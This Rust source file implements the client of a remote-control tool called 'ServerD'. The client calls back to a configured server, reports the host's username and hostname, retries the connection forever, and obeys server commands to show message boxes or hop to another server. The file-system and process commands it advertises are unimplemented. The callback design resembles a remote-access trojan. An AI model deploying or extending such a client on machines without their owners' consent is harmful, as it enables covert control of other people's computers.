use std::io::{Read, Write};
use std::net::TcpStream;
use std::{thread, time};

use anyhow::Result;
use tracing::{debug, error, info};

use crate::addreses::Address;
use crate::{lock_mutex, utils::*, TCP_ADDRESS};

pub fn connect() {
    match Client::new(lock_mutex!(TCP_ADDRESS).get(0).unwrap_or(&Address::default()).format()) {
        Ok(mut client) => {
            info!("Connected!");

            // reconnect if error
            if let Err(e) = client.run() {
                error!("Unexpected error {e}");
                thread::sleep(time::Duration::from_secs(10));
                connect();
            }
        }
        Err(_e) => {
            error!("Unable to connect to the server. Reconnecting...");
            thread::sleep(time::Duration::from_secs(10));
            connect();
        }
    }
}

pub struct Client {
    stream: TcpStream,
    connected: bool,
}

impl Client {
    pub fn new(address: String) -> anyhow::Result<Self> {
        let stream = TcpStream::connect(address)?;

        Ok(Self {
            stream,
            connected: true,
        })
    }

    pub fn receive(&mut self) -> Result<String> {
        let mut data = [0; 65536];

        let len = self.stream.read(&mut data)?;

        let recv_buf = &data[0..len];

        let ret = String::from_utf8(recv_buf.to_vec())?;

        debug!("[Received]: {}", ret);

        Ok(ret)
    }

    pub fn send(&mut self, message: &str) -> Result<()> {
        debug!("[Sended]: {}", message);

        self.stream.write_all(message.to_string().as_bytes())?;

        Ok(())
    }

    pub fn send_command(&mut self, message: &str) -> Result<String> {
        self.send(message)?;
        self.receive()
    }

    pub fn check_args(&mut self, args: Vec<&str>, length: usize) -> Result<bool> {
        if args.len() < length {
            self.send("Missing arguments")?;
            return Ok(false);
        } else if args.len() < length {
            self.send("To much arguments")?;
            return Ok(false);
        }
        Ok(true)
    }

    pub fn close(&mut self) -> Result<()> {
        self.connected = false;

        self.stream.shutdown(std::net::Shutdown::Both)?;

        Ok(())
    }

    pub fn run(&mut self) -> Result<()> {
        info!("Client started working");

        self.send_command(
            format!("/setname {}@{}", whoami::username(), whoami::hostname()).as_str(),
        )?;

        while self.connected {
            let message = self.receive()?;
            let command = message.split_ascii_whitespace().collect::<Vec<&str>>();
            println!("{}", command.len());
            let args = command[1..command.len()].to_vec();

            match command[0] {
                "msg" => {
                    if self.check_args(args.clone(), 1)? {
                        messagebox(args.join(" "));
                        self.send("Done")?;
                    }
                }
                "run" => {}
                "reconnect" => {
                    if self.check_args(args.clone(), 2)? {
                        match Client::new(format!("{}:{}", args[0], args[1])) {
                            Ok(mut client) => {
                                info!("Reconnected succesfully to {}:{}!", args[0], args[1]);

                                self.send("Succesfully reconnected client... disconnecting...")?;
                                self.send_command("/disconnect")?;
                                self.close()?;

                                client.run()?;
                            }
                            Err(_e) => {
                                error!("Error reconnecting to server");
                                self.send("Error reconnecting to server")?;
                            }
                        }
                    }
                }
                "disconnect" => {
                    self.send("Done")?;

                    self.send_command("/disconnect")?;
                    self.close()?;
                }
                "ping" => self.send("Ping received")?,

                "help" => {
                    let help = format!(
                        "{}{}{}{}{}{}{}{}{}{}{}{}",
                        "msg <message> - showing message\n",
                        "run <process> <args> - run process\n",
                        "reconnect <ip> <port> - reconnecting to another ServerD\n",
                        "disconnect - disconnecting ServerD Client\n",
                        "ping - sending ping\n",
                        "help - showing help\n",
                        "cd <dir> - changing dir",
                        "pwd - showing directory\n",
                        "ls - list files in dir\n",
                        "mkdir <name> - creating folder\n",
                        "rm <name> - removing file\n",
                        "cat <name> - reading file"
                    );
                    self.send(&help)?;
                }
                _ => self.send("Unknown command")?,
            }
        }

        Ok(())
    }
}

/// "Correctly" close connection
impl Drop for Client {
    // TODO: all logger for example .unwrap_log()
    #[allow(unused_must_use)]
    fn drop(&mut self) {
        self.send_command("/disconnect");
        self.close();
    }
}
